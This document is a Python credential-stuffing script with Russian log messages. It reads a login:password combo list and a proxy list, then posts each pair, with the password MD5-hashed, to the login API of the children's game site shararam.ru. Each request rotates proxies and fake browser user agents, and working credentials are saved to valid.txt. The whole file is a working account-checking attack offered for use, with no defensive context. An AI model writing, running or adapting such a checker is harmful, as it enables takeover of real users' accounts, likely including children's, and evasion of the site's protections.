import random
import time
import hashlib
import aiofiles
import asyncio
from concurrent.futures import ThreadPoolExecutor
from loguru import logger as lg
from fake_useragent import UserAgent
from aiohttp import ClientSession

proxies = []

async def valid(login, password):
    async with aiofiles.open('valid.txt', mode='a+') as f:
        await f.write(f"{login}:{password}\n")

async def novalid(login, password):
    async with aiofiles.open('no_valid.txt', mode='a+') as f:
        await f.write(f"{login}:{password}\n")

class Worker:
    def __init__(self, executor):
        self.executor = executor

    @staticmethod
    def gen_proxy():
        return random.choice(proxies)

    async def run(self, login: str, password: str):
        while True:
            try:
                ua = UserAgent()
                pr = self.gen_proxy()
                url = 'https://www.shararam.ru/api/user/login'
                async with ClientSession() as session:
                    async with session.post(url, headers={
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                        'content-type': 'application/json; charset=UTF-8',
                        'user-agent': ua.chrome,
                    }, json={
                        'login': login,
                        'password': hashlib.md5(password.encode('utf-8')).hexdigest()
                    }, proxy=pr) as response:
                        if response.status == 200:
                            json = await response.json()
                            if json['code'] == 0:
                                lg.success(f"{login}:{password} | Валид")
                                await valid(login, password)
                            elif json['error']:
                                if 'Ой' in json['error']:
                                    lg.success(f"Все прокси сломались. стоп... {json['error']}")
                                    break
                                else:
                                    lg.success(f"{login}:{password} | Невалид, причина: {json['error']}")
                                    await novalid(login, password)
            except Exception as e:
                lg.error(f"Ошибка: {e}")

async def start(login, password):
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=1) as executor:
        check = Worker(executor)
        await loop.run_in_executor(executor, check.run, login, password)

async def main():
    a = input('Введите путь к файлу с login:password : ')
    b = input('Введите путь к файлу с прокси: ')
    lg.info('Ожидайте информацию..')
    async with aiofiles.open(b, 'r') as f:
        global proxies
        async for line in f:
            line = line.replace('\n', '')
            proxies.append(line)
    async with aiofiles.open(a, "r") as f:
        async for i in f:
            login, password = i.strip().split(":")
            await start(login, password)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
